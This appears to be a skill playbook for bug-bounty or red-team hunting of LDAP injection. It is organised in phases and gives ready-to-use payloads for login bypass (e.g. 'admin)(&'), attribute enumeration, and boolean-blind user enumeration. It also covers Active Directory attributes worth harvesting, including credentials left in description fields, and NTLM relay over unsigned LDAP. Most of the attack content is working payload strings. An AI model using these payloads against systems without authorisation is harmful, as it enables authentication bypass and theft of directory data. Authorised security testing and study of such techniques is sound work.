---
name: hunt-ldap
description: LDAP injection — auth bypass, attribute enum, LDAPS hijack, AD-specific gotchas.
keywords: [ldap, ldap injection, active directory, ad, dn, base dn, openldap]
---

# hunt-ldap

## Triggers

"ldap", "active directory", "ad ldap", "ldap injection", "openldap".

## Phase 1 — find the endpoint

Common: corporate login portals, address-book search,
"forgot password" by email lookup.

## Phase 2 — confirm injection

```
*                    (returns all users)
*)(uid=*             (or-injection)
*))(|(uid=*          (close+open)
admin)(&             (cluster bypass)
admin)(|(password=*  (cluster — works if app builds `(uid=$user)(password=$pass)`)
```

Login bypass classic:

```
username: admin)(&
password: doesntmatter
```

Builds: `(&(uid=admin)(&)(password=doesntmatter))` — `(&)` is
always-true, password check skipped.

## Phase 3 — attribute enum

```
*)(uid=admin)(|(uid=*       (return first matching)
*)(objectClass=*            (dump all object classes)
```

## Phase 4 — boolean blind

If app returns "login OK / not OK":

```
admin)(|(uid=a*)(&         (test if any user starts with 'a')
```

Binary-search the user list.

## Phase 5 — AD-specific

Active Directory accepts LDAP queries via:

- `LDAP://dc=example,dc=com`
- `LDAPS://...:636`
- Global Catalog `:3268`

AD attributes worth reading:

- `sAMAccountName`, `userPrincipalName`
- `memberOf`
- `pwdLastSet`
- `userAccountControl` (flags: locked, disabled)
- `description` (sometimes contains creds — yes, really)
- `sIDHistory`

## Phase 6 — LDAP signing / channel-binding

LDAP without signing + STARTTLS is MITM-relayable (PetitPotam,
NTLM relay). Off-table for external bug-bounty but key in red-team.

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| CVE-2019-1040 (LDAP signing) | NTLM relay |
| Various corporate intranet LDAP injections | login bypass |
| OWASP LDAP Injection Prevention CS | reference |

## Never-submit fallbacks

- LDAP error 500 from `(` without further extraction → CHAIN REQUIRED
- LDAP enum returning org chart only → DOWNGRADE

## See also

- `hunt-auth`, `hunt-sqli`
